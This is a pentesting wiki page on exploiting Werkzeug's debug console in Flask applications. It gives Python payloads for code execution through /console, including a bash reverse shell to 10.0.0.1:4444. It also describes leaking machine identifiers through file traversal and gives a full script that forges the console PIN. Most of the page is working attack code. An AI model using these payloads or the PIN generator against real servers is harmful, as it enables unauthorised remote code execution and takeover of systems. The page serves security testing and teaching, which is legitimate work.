# Werkzeug

## Theory

Werkzeug is a comprehensive [WSGI](https://wsgi.readthedocs.io/en/latest/) web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries. It is commonly used for Flask web application.

## Practice

### Console RCE

If debug is active you could try to access to `/console` endpoint or to trigger a Werkzeug error and gain RCE.

{% tabs %}
{% tab title="Exploit" %}
```python
__import__('os').popen('whoami').read();
import os; print(os.popen("whoami").read())

# Reverse shell
__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()
```
{% endtab %}
{% endtabs %}

### Console PIN Exploit

In some occasions the **`/console`** endpoint is going to be protected by a pin. If you have a **file traversal vulnerability**, you can leak all the necessary info to generate that pin.

According to the Werkzeug [PIN generation source code](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/\_\_init\_\_.py), here are the needed variables to generate the PIN code:

<details>

<summary>Needed variables</summary>

Variables needed to exploit the console PIN:&#x20;

```python
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```

</details>

<details>

<summary>probably_public_bits</summary>

#### username

This is the user who started this Flask instance. You may find it in `/proc/self/environ`

#### modname

It's flask.app

#### getattr(app, '**name**', getattr (app .\_\_ class\_\_, '**name**'))

is Flask

#### getattr(mod, '\_\_file\_\_', None)

is the absolute path of `app.py` in the flask directory (e.g. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). If `app.py` doesn't work, try `app.pyc` \
You may find this information in the Werkzeug error message.

</details>

<details>

<summary>private_bits</summary>

#### uuid.getnode()

is the MAC address of the current computer, str(uuid.getnode()) is the decimal expression of the mac address.

To find server MAC address, need to know which network interface is being used to serve the app (e.g. ens3). If unknown, leak `/proc/net/arp` for device ID and then leak MAC address at `/sys/class/net/<device id>/address`.

Convert **from hex address to decimal** representation by running in python e.g.:

```python
# It was 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```

#### get\_machine\_id()

concatenate the values in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` with the first line of `/proc/self/cgroup` after the last slash (/).

To clarify, here is the code used by Werkzeug to generate the machine\_id

```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:                                                                                                  
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> t.Optional[t.Union[str, bytes]]:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
```

</details>

Once all variables prepared, run exploit script to generate Werkzeug console PIN:

<details>

<summary>Generate the PIN</summary>

You can use the following code with previous values to generate a valid PIN code

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

</details>

## Resources

{% embed url="https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" %}
